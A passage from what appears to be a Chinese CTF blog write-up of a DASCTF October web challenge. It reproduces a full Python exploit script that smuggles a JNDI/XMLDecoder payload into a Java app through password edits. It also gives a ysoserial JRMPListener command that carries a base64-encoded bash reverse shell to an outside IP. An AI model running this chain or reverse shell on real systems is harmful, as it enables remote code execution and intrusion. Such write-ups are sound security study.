<li>对于<code>&lt;java&gt;&lt;/java&gt;</code>这两个我们可以改成<code>&lt;!--</code>注释符，将<code>java</code>替换为<code>!--</code>配合我们的注释符</li>
<li>对于写入payload，只需将oldpassword设置为任意标识符，例如<code>_____</code>，然后newpassword为<code>xxxxx_____</code>即可不断写入</li>
</ul>
<p>由此可以写一个exp，这里就直接利用出题人的wp了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">targeturl = <span class="string">&quot;http://&quot;</span>+sys.argv[<span class="number">1</span>] //靶机地址</span><br><span class="line"></span><br><span class="line">rmiserver = sys.argv[<span class="number">2</span>] //rmi服务器地址</span><br><span class="line"></span><br><span class="line">sessions = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">passwd</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;password&quot;</span>:passwd,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;F&quot;</span>&#125;</span><br><span class="line">    res = requests.post(targeturl+<span class="string">&quot;/register&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;register <span class="subst">&#123;passwd&#125;</span> success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span> : <span class="built_in">print</span>(<span class="string">f&quot;register fail: <span class="subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="number">114514</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsession</span>(<span class="params">passwd</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;password&quot;</span>:passwd,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;F&quot;</span>&#125;</span><br><span class="line">    res = requests.post(targeturl+<span class="string">&quot;/login&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;redirect&quot;</span> <span class="keyword">in</span> res.text.lower() :</span><br><span class="line">        session=res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;session for <span class="subst">&#123;passwd&#125;</span> : <span class="subst">&#123;session&#125;</span>&quot;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">f&quot;JSESSIONID=<span class="subst">&#123;session&#125;</span>&quot;</span>&#125;</span><br><span class="line">        sessions[passwd] = headers</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;login fail : <span class="subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="number">114514</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editpass</span>(<span class="params">oldpass,newpass</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;newPass&quot;</span>:newpass&#125;</span><br><span class="line">    headers = sessions[oldpass]</span><br><span class="line">    res = requests.post(targeturl+<span class="string">&quot;/editPass&quot;</span>,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;change <span class="subst">&#123;oldpass&#125;</span> to <span class="subst">&#123;newpass&#125;</span> success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;edit fail : <span class="subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="number">114514</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deluser</span>(<span class="params">passwd</span>):</span><br><span class="line">    res = requests.get(targeturl+<span class="string">&quot;/del&quot;</span>,headers=sessions[passwd])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;delete <span class="subst">&#123;passwd&#125;</span> success&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addsession</span>(<span class="params">passwd</span>):</span><br><span class="line">    register(passwd)</span><br><span class="line">    getsession(passwd)</span><br><span class="line">    deluser(passwd)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span>+rmiserver+<span class="string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span></span><br><span class="line">list1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload1),<span class="number">5</span>) :</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload1) - i &gt;= <span class="number">5</span>:</span><br><span class="line">        list1.append(payload1[i:i+<span class="number">5</span>:]+<span class="string">&quot;_____&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        list1.append(payload1[i:<span class="built_in">len</span>(payload1)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(list1[-<span class="number">1</span>]) &lt; <span class="number">3</span>:</span><br><span class="line">    list1[-<span class="number">1</span>]=list1[-<span class="number">2</span>][-<span class="number">8</span>:-<span class="number">5</span>:]+list1[-<span class="number">1</span>]</span><br><span class="line">    list1[-<span class="number">2</span>]=list1[-<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>]+list1[-<span class="number">2</span>][-<span class="number">5</span>:-<span class="number">1</span>:]</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list2=[]</span><br><span class="line">payload2=<span class="string">&quot;11111 class=\&quot;org.example.auth.User\&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload2),<span class="number">10</span>) :</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload2) - i &gt;= <span class="number">10</span>:</span><br><span class="line">        list2.append(payload2[i:i+<span class="number">10</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        list2.append(payload2[i:<span class="built_in">len</span>(payload2)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(list2)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list2:</span><br><span class="line">    addsession(s)</span><br><span class="line"></span><br><span class="line">list3=[]</span><br><span class="line">payload3=<span class="string">&quot;void property=\&quot;username\&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload3),<span class="number">10</span>) :</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload3) - i &gt;= <span class="number">10</span>:</span><br><span class="line">        list3.append(payload3[i:i+<span class="number">10</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        list3.append(payload3[i:<span class="built_in">len</span>(payload3)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(list3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list4=[]</span><br><span class="line">payload4=<span class="string">&quot;void property=\&quot;password\&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload4),<span class="number">10</span>) :</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload4) - i &gt;= <span class="number">10</span>:</span><br><span class="line">        list4.append(payload4[i:i+<span class="number">10</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        list4.append(payload4[i:<span class="built_in">len</span>(payload4)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(list4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;_____&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;____&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list3:</span><br><span class="line">    addsession(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list4:</span><br><span class="line">    addsession(s)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;string&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;object&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;/void&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;    &quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;1111111111&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;/11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;java&quot;</span>)</span><br><span class="line"></span><br><span class="line">addsession(<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">&quot;haha&quot;</span>)</span><br><span class="line">getsession(<span class="string">&quot;haha&quot;</span>)</span><br><span class="line">editpass(<span class="string">&quot;java&quot;</span>,<span class="string">&quot;!--&quot;</span>)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;string&quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line">editpass(<span class="string">&quot;object&quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;/11111&quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line">editpass(<span class="string">&quot;    &quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;/void&quot;</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list2:</span><br><span class="line">    editpass(s,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list3:</span><br><span class="line">    editpass(s,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list4:</span><br><span class="line">    editpass(s,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;1111111111&quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line">editpass(<span class="string">&quot;1111111111&quot;</span>,<span class="string">&quot;11111&quot;</span>)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;haha&quot;</span>,list1[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;11111&quot;</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now it&#x27;s the shortest (237)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> list1[<span class="number">1</span>::]:</span><br><span class="line">    editpass(<span class="string">&quot;_____&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">editpass(<span class="string">&quot;____&quot;</span>,<span class="string">&quot;&lt;!--&quot;</span>)</span><br><span class="line"></span><br><span class="line">requests.post(targeturl+<span class="string">&quot;/login&quot;</span>,data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;F&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p><s>可惜复现失败T_T，投降，jndi还是太难了</s></p>
<p><strong>updated in 2024.10.26</strong></p>
<p>红温了，原来是我vps没有开放80端口：</p>
<img src="/posts/49264/28.jpg" class title="awa">
<p>可以看到红框内换到6001端口就能发payload了，按照正常流程打一遍jrmp即可:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdk1.8.0_112/bin/java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6001 Jackson &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMjcuNzQvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>shell弹过来了：</p>
<img src="/posts/49264/29.jpg" class title="awa">
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/49264.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/49264.html";
            const title         = "「dasctf十月web方向部分题解」";
            const excerpt       = `被ld.so.preload气晕。`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-10-26T15:10:11.612Z" itemprop="dateModified">最后编辑：2024-10-26</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" tornado原型链污染学习" href="/posts/61598.html">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 2024鹏城杯线上赛Web方向题解" href="/posts/10200.html">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/49264.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//博主邮箱
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
            //verify: true, //验证码
            avatar: 'monsterid',//小怪物头像
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                85
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                12
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.71em;">渗透</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/25622.html"><i class="fa  fa-book"></i> SUCTF2025 Web方向部分思路</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/58260.html"><i class="fa  fa-book"></i> VulnStack 7</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/6350.html"><i class="fa  fa-book"></i> SPEL注入Spring内存马</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/58068.html"><i class="fa  fa-book"></i> VulnStack 4</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/10200.html"><i class="fa  fa-book"></i> 2024鹏城杯线上赛Web方向题解</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2025 Err0r233 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
      return r + ""
      }),
      a = 2,
